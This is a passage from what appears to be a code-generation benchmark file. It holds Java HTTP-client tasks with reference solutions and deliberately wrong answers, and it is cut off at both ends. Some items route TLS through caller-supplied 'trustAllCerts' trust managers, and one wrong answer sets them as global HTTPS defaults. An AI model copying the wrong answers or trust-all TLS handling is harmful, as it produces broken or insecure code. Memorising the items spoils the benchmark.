private static final String HEADER_CONTENT_TYPE = \"Content-Type\";\n    private static final String HEADER_ACCEPT = \"Accept\";\n    private static final String HEADER_ACCEPT_LANGUAGE = \"Accept-Language\";\n    private static final String HEADER_USER_AGENT = \"User-Agent\";\n\n    private static final String HEADER_VALUE_ACCEPT =\n            \"*/*, application/vnd.wap.mms-message, application/vnd.wap.sic\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET =\n            \"application/vnd.wap.mms-message; charset=utf-8\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET =\n            \"application/vnd.wap.mms-message\";\n\n    private final Context mContext;\n    private final SocketFactory mSocketFactory;\n    private final MmsNetworkManager mHostResolver;\n    private final ConnectionPool mConnectionPool;\n\n    public MmsHttpClient(Context context, SocketFactory socketFactory, MmsNetworkManager hostResolver,\n            ConnectionPool connectionPool) {\n        mContext = context;\n        mSocketFactory = socketFactory;\n        mHostResolver = hostResolver;\n        mConnectionPool = connectionPool;\n    }\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet,\n            String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig)\n            throws MmsHttpException {\n        Timber.d(\"HTTP: \" + method + \" \" + urlString\n                + (isProxySet ? (\", proxy=\" + proxyHost + \":\" + proxyPort) : \"\")\n                + \", PDU size=\" + (pdu != null ? pdu.length : 0));\n        checkMethod(method);\n        HttpURLConnection connection = null;\n        try {\n            Proxy proxy = null;\n            if (isProxySet) {\n                proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));\n            }\n            final URL url = new URL(urlString);\n            connection = openConnection(url, proxy);\n            connection.setDoInput(true);\n            connection.setConnectTimeout(mmsConfig.getHttpSocketTimeout());\n            connection.setRequestProperty(HEADER_ACCEPT, HEADER_VALUE_ACCEPT);\n            connection.setRequestProperty(\n                    HEADER_ACCEPT_LANGUAGE, getCurrentAcceptLanguage(Locale.getDefault()));\n            final String userAgent = mmsConfig.getUserAgent();\n            Timber.i(\"HTTP: User-Agent=\" + userAgent);\n            connection.setRequestProperty(HEADER_USER_AGENT, userAgent);\n            final String uaProfUrlTagName = mmsConfig.getUaProfTagName();\n            final String uaProfUrl = mmsConfig.getUaProfUrl();\n            if (uaProfUrl != null) {\n                Timber.i(\"HTTP: UaProfUrl=\" + uaProfUrl);\n                connection.setRequestProperty(uaProfUrlTagName, uaProfUrl);\n            }\n            addExtraHeaders(connection, mmsConfig);\n            if (METHOD_POST.equals(method)) {\n                if (pdu == null || pdu.length < 1) {\n                    Timber.e(\"HTTP: empty pdu\");\n                    throw new MmsHttpException(0/*statusCode*/, \"Sending empty PDU\");\n                }\n                connection.setDoOutput(true);\n                connection.setRequestMethod(METHOD_POST);\n                if (mmsConfig.getSupportHttpCharsetHeader()) {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET);\n                } else {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET);\n                }\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setFixedLengthStreamingMode(pdu.length);\n                final OutputStream out = new BufferedOutputStream(connection.getOutputStream());\n                out.write(pdu);\n                out.flush();\n                out.close();\n            } else if (METHOD_GET.equals(method)) {\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setRequestMethod(METHOD_GET);\n            }\n            final int responseCode = connection.getResponseCode();\n            final String responseMessage = connection.getResponseMessage();\n            Timber.d(\"HTTP: \" + responseCode + \" \" + responseMessage);\n            logHttpHeaders(connection.getHeaderFields());\n            if (responseCode / 100 != 2) {\n                throw new MmsHttpException(responseCode, responseMessage);\n            }\n            final InputStream in = new BufferedInputStream(connection.getInputStream());\n            final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();\n            final byte[] buf = new byte[4096];\n            int count = 0;\n            while ((count = in.read(buf)) > 0) {\n                byteOut.write(buf, 0, count);\n            }\n            in.close();\n            final byte[] responseBody = byteOut.toByteArray();\n            Timber.d(\"HTTP: response size=\"\n                    + (responseBody != null ? responseBody.length : 0));\n            return responseBody;\n        } catch (MalformedURLException e) {\n            Timber.e(e, \"HTTP: invalid URL \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL \" + urlString, e);\n        } catch (ProtocolException e) {\n            Timber.e(e, \"HTTP: invalid URL protocol \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL protocol \" + urlString, e);\n        } catch (IOException e) {\n            Timber.e(e, \"HTTP: IO failure\");\n            throw new MmsHttpException(0/*statusCode*/, e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url, final Proxy proxy) throws MalformedURLException {\n        final String protocol = url.getProtocol();\n        OkHttpClient okHttpClient;\n        if (protocol.equals(\"http\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setFollowRedirects(false);\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    if (proxy != null) {\n                        return Arrays.asList(proxy);\n                    } else {\n                        return new ArrayList<Proxy>();\n                    }\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            okHttpClient.setSocketFactory(SocketFactory.getDefault());\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            if (proxy != null) {\n                okHttpClient.setProxy(proxy);\n            }\n\n            return new HttpURLConnectionImpl(url, okHttpClient);\n        } else if (protocol.equals(\"https\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            HostnameVerifier verifier = HttpsURLConnection.getDefaultHostnameVerifier();\n            okHttpClient.setHostnameVerifier(verifier);\n            okHttpClient.setSslSocketFactory(HttpsURLConnection.getDefaultSSLSocketFactory());\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    return Arrays.asList(proxy);\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            return new HttpsURLConnectionImpl(url, okHttpClient);\n        } else {\n            throw new MalformedURLException(\"Invalid URL or unrecognized protocol \" + protocol);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class MmsHttpClient {\n    private Context mContext;\n    private SocketFactory mSocketFactory;\n    private MmsNetworkManager mHostResolver;\n    private ConnectionPool mConnectionPool;\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) {\n        checkMethod(method);\n        try {\n            URL url = new URL(urlString);\n            Proxy proxy = isProxySet ? new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort)) : null;\n            HttpURLConnection connection = openConnection(url, proxy);\n            connection.setRequestMethod(method);\n            addExtraHeaders(connection, mmsConfig);\n            connection.setRequestProperty(\"Accept-Language\", getCurrentAcceptLanguage(Locale.getDefault()));\n            if (\"POST\".equals(method)) {\n                connection.setDoOutput(true);\n                connection.setRequestProperty(\"Content-Type\", \"application/vnd.wap.mms-message\");\n                connection.setRequestProperty(\"Content-Length\", String.valueOf(pdu.length));\n                try (OutputStream os = connection.getOutputStream()) {\n                    os.write(pdu);\n                }\n            }\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                try (InputStream is = connection.getInputStream()) {\n                    byte[] buffer = new byte[4096];\n                    int bytesRead;\n                    ByteArrayOutputStream output = new ByteArrayOutputStream();\n                    while ((bytesRead = is.read(buffer)) != -1) {\n                        output.write(buffer, 0, bytesRead);\n                    }\n                    return output.toByteArray();\n                }\n            } else {\n                try (InputStream is = connection.getErrorStream()) {\n                    byte[] buffer = new byte[4096];\n                    int bytesRead;\n                    ByteArrayOutputStream output = new ByteArrayOutputStream();\n                    while ((bytesRead = is.read(buffer)) != -1) {\n                        output.write(buffer, 0, bytesRead);\n                    }\n                    return output.toByteArray();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return new byte[0];\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url, Proxy proxy) throws MalformedURLException {\n        if (url == null) {\n            throw new MalformedURLException(\"Invalid URL\");\n        }\n        return (HttpURLConnection) url.openConnection(proxy);\n    }\n\n    private void checkMethod(String method) {\n        if (!method.equals(\"GET\") && !method.equals(\"POST\")) {\n            throw new IllegalArgumentException(\"Unsupported HTTP method: \" + method);\n        }\n    }\n\n    private String getCurrentAcceptLanguage(Locale locale) {\n        return locale.getLanguage() + \"-\" + locale.getCountry();\n    }\n\n    private void addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) {\n        if (mmsConfig != null) {\n            connection.setRequestProperty(\"User-Agent\", \"MmsHttpClient/1.0\");\n            connection.setRequestProperty(\"Accept\", \"application/vnd.wap.mms-message\");\n            if (mmsConfig.getCustomHeaders() != null) {\n                for (Map.Entry<String, String> entry : mmsConfig.getCustomHeaders().entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n        }\n    }\n\n    private void logHttpHeaders(Map<String, List<String>> headers) {\n        if (headers != null) {\n            for (Map.Entry<String, List<String>> entry : headers.entrySet()) {\n                System.out.println(\"Header: \" + entry.getKey() + \" = \" + entry.getValue());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Create a Java class that handles HTTP POST requests to a specified URL, with callback functionality for success and failure cases.\n\nClass Description: The HttpRequestHandler class is responsible for sending HTTP POST requests to a predefined URL. It encapsulates the connection setup, request parameter encoding, and response handling, providing callback methods to notify the caller of the request outcome.\n\nAttributes:\n- packageName: String - The package name to be sent as a parameter in the POST request\n- callback: OnRequestCallback - The callback interface to handle request success or failure\n\nMethods:\n- sendPostRequest(): void - Sends a POST request to the configured URL with the packageName as a parameter. Handles connection setup, timeout configuration, request writing, and response processing. Notifies the callback of success or failure.\n- HttpRequestHandler(String, OnRequestCallback): Constructor - Initializes the handler with a package name and callback interface\n\nInterface:\n- OnRequestCallback: Interface defining callback methods for request outcomes\n  - onSuccess(): void - Called when the request succeeds (response code < 400)\n  - onFailure(Exception): void - Called when the request fails (response code >= 400 or IO exception occurs)",
    "Canonical_solution": "import java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpRequestHandler {\n\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback/app\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"pkg\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(packageName, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n        void onFailure(Exception e);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public interface OnRequestCallback {\n    void onSuccess();\n    void onFailure(Exception e);\n}\n\npublic class HttpRequestHandler {\n    private String packageName;\n    private OnRequestCallback callback;\n    private static final String URL = \"https://api.example.com/post\";\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(URL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(5000);\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            conn.setDoOutput(true);\n\n            String postParams = \"packageName=\" + java.net.URLEncoder.encode(packageName, \"UTF-8\");\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] data = postParams.getBytes(\"UTF-8\");\n                os.write(data);\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode < 400) {\n                callback.onSuccess();\n            } else {\n                callback.onFailure(new Exception(\"Server returned code \" + responseCode));\n            }\n        } catch (Exception e) {\n            callback.onFailure(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a Java function that sends an HTTP POST request to a specified URL with a given message, verifies the response status code, and compares the response content with the original message.\n\nFunction Description: The function establishes an HTTP connection using HttpURLConnection, sends a POST request with the provided message as the request body, reads the response, and asserts that the response status code is OK (200) and that the response content matches the original message. If the response doesn't match, it prints the hexadecimal representation of the response.\n\nInput: \n- message: String - The message to be sent in the request body\n- url: String - The endpoint path to which the request is sent (appended to a base URL)\n\nOutput: \n- None (void) - The function performs assertions and may print debug information but doesn't return any value\n- Throws: IOException - If any I/O error occurs during the HTTP communication",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate void runTestViaJavaImpl(final String message, String url) throws IOException {\n    HttpURLConnection urlcon = null;\n    try {\n        String uri = getBaseUrl() + \"/servletContext/\" + url;\n        urlcon = (HttpURLConnection) new URL(uri).openConnection();\n        urlcon.setInstanceFollowRedirects(true);\n        urlcon.setRequestProperty(\"Connection\", \"close\");\n        urlcon.setRequestMethod(\"POST\");\n        urlcon.setDoInput(true);\n        urlcon.setDoOutput(true);\n        OutputStream os = urlcon.getOutputStream();\n        os.write(message.getBytes());\n        os.close();\n        Assert.assertEquals(StatusCodes.OK, urlcon.getResponseCode());\n        InputStream is = urlcon.getInputStream();\n\n        ByteArrayOutputStream bytes = new ByteArrayOutputStream();\n        byte[] buf = new byte[256];\n        int len;\n        while ((len = is.read(buf)) > 0) {\n            bytes.write(buf, 0, len);\n        }\n        is.close();\n        final String response = new String(bytes.toByteArray(), 0, bytes.size());\n        if (!message.equals(response)) {\n            System.out.println(String.format(\"response=%s\", Hex.encodeHexString(response.getBytes())));\n        }\n        Assert.assertEquals(message, response);\n    } finally {\n        if (urlcon != null) {\n            urlcon.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Arrays;\n\npublic class HttpPostSender {\n    public static void sendPostRequest(String message, String url) throws IOException {\n        URL urlObj = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"text/plain\");\n\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);\n            os.write(messageBytes);\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            System.out.println(\"Response code: \" + responseCode);\n        }\n\n        InputStream inputStream = conn.getInputStream();\n        if (inputStream == null) {\n            inputStream = conn.getErrorStream();\n        }\n\n        try (InputStream is = inputStream) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            ByteArrayOutputStream responseBytes = new ByteArrayOutputStream();\n            while ((bytesRead = is.read(buffer)) != -1) {\n                responseBytes.write(buffer, 0, bytesRead);\n            }\n            byte[] responseBytesArray = responseBytes.toByteArray();\n\n            byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);\n            if (!Arrays.equals(messageBytes, responseBytesArray)) {\n                StringBuilder hex = new StringBuilder();\n                for (byte b : responseBytesArray) {\n                    hex.append(String.format(\"%02x\", b & 0xff));\n                }\n                System.out.println(\"Hex response: \" + hex.toString());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for streaming content with support for caching, custom headers, and SSL verification.\n\nClass Description: HttpUrlSource is a class that provides HTTP content streaming functionality with features like range requests, redirect handling, SSL customization, and header injection. It's designed to work with a caching system and stores source information (URL, length, MIME type) persistently.\n\nAttributes:\n- sourceInfoStorage: SourceInfoStorage - Stores and retrieves source information (URL, length, MIME type)\n- headerInjector: HeaderInjector - Injects custom headers into HTTP requests\n- v: HostnameVerifier - Custom hostname verifier for SSL connections\n- trustAllCerts: TrustManager[] - Custom trust managers for SSL connections\n- sourceInfo: SourceInfo - Contains URL, content length and MIME type information\n- connection: HttpURLConnection - Active HTTP connection\n- inputStream: InputStream - Stream for reading content\n\nMethods:\n- HttpUrlSource(String, HostnameVerifier, TrustManager[]) -> void - Constructor with URL, hostname verifier and trust managers\n- HttpUrlSource(String, SourceInfoStorage, HostnameVerifier, TrustManager[]) -> void - Constructor with additional source info storage\n- HttpUrlSource(String, SourceInfoStorage, HeaderInjector, HostnameVerifier, TrustManager[]) -> void - Full constructor with all dependencies\n- length() -> long - Returns content length, fetches if not known\n- open(long) -> void - Opens connection at specified offset\n- close() -> void - Closes current connection\n- read(byte[]) -> int - Reads data into buffer\n- getMime() -> String - Returns MIME type, fetches if not known\n- getUrl() -> String - Returns source URL\n- openConnection(long, int) -> HttpURLConnection - Internal method to open connection with offset and timeout\n- injectCustomHeaders(HttpURLConnection, String) -> void - Injects custom headers into connection\n- readSourceAvailableBytes(HttpURLConnection, long, int) -> long - Calculates available bytes based on response\n- getContentLength(HttpURLConnection) -> long - Extracts content length from headers\n- fetchContentInfo() -> void - Fetches content information (length and MIME type)",
    "Canonical_solution": "import com.danikula.videocache.headers.EmptyHeadersInjector;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorageFactory;\n\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Map;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\n\npublic class HttpUrlSource implements Source {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private final HostnameVerifier v;\n    private final TrustManager[] trustAllCerts;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, SourceInfoStorageFactory.newEmptySourceInfoStorage(), v, trustAllCerts);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, sourceInfoStorage, new EmptyHeadersInjector(), v, trustAllCerts);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.headerInjector = headerInjector;\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n            new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    @Override\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    @Override\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n            : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    @Override\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    @Override\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            if (url.startsWith(\"https\") && v != null && trustAllCerts != null) {\n                connection = (HttpURLConnection) new URL(url).openConnection();\n                ((HttpsURLConnection) connection).setHostnameVerifier(v);\n                try {\n                    SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                    sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n                    SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(sslSocketFactory);\n                    ((HttpsURLConnection) connection).setHostnameVerifier(v);\n                } catch (NoSuchAlgorithmException | KeyManagementException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                connection = (HttpURLConnection) new URL(url).openConnection();\n            }\n            injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        if (extraHeaders == null) {\n            return;\n        }\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUrlSource {\n    private SourceInfoStorage sourceInfoStorage;\n    private HeaderInjector headerInjector;\n    private HostnameVerifier v;\n    private TrustManager[] trustAllCerts;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n    private String url;\n\n    public HttpUrlSource(String url, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.url = url;\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n            HttpsURLConnection.setDefaultHostnameVerifier(v);\n        } catch (Exception e) {\n            throw new RuntimeException(\"SSL setup failed\", e);\n        }\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, v, trustAllCerts);\n        this.sourceInfoStorage = sourceInfoStorage;\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, sourceInfoStorage, v, trustAllCerts);\n        this.headerInjector = headerInjector;\n    }\n\n    public long length() {\n        if (sourceInfo != null && sourceInfo.getLength() > 0) {\n            return sourceInfo.getLength();\n        }\n        fetchContentInfo();\n        return sourceInfo.getLength();\n    }\n\n    public void open(long offset) {\n        try {\n            connection = (HttpURLConnection) new URL(url).openConnection();\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setRequestMethod(\"GET\");\n            connection.setInstanceFollowRedirects(false);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            injectCustomHeaders(connection, \"X-Custom-Header\");\n            inputStream = connection.getInputStream();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to open connection\", e);\n        }\n    }\n\n    public void close() {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to close connection\", e);\n        }\n    }\n\n    public int read(byte[] buffer) {\n        try {\n            int bytesRead = inputStream.read(buffer);\n            if (bytesRead == -1) {\n                close();\n            }\n            return bytesRead;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to read from stream\", e);\n        }\n    }\n\n    public String getMime() {\n        if (sourceInfo != null && sourceInfo.getMimeType() != null) {\n            return sourceInfo.getMimeType();\n        }\n        fetchContentInfo();\n        return sourceInfo.getMimeType();\n    }\n\n    public String getUrl() {\n        return url;\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setConnectTimeout(timeout);\n            conn.setReadTimeout(timeout);\n            conn.setRequestMethod(\"GET\");\n            conn.setInstanceFollowRedirects(false);\n            if (offset > 0) {\n                conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            injectCustomHeaders(conn, \"X-Custom-Header\");\n            return conn;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to open connection\", e);\n        }\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String headers) {\n        if (headerInjector != null) {\n            String[] headerLines = headers.split(\",\");\n            for (String headerLine : headerLines) {\n                String[] parts = headerLine.trim().split(\":\");\n                if (parts.length == 2) {\n                    connection.setRequestProperty(parts[0].trim(), parts[1].trim());\n                }\n            }\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int timeout) {\n        try {\n            connection.setConnectTimeout(timeout);\n            connection.setReadTimeout(timeout);\n            connection.setRequestMethod(\"HEAD\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_PARTIAL) {\n                return getContentLength(connection);\n            }\n            return 0;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to read available bytes\", e);\n        }\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        return connection.getContentLengthLong();\n    }\n\n    private void fetchContentInfo() {\n        if (sourceInfo != null && sourceInfo.isPopulated()) {\n            return;\n        }\n        try {\n            HttpURLConnection conn = openConnection(0, 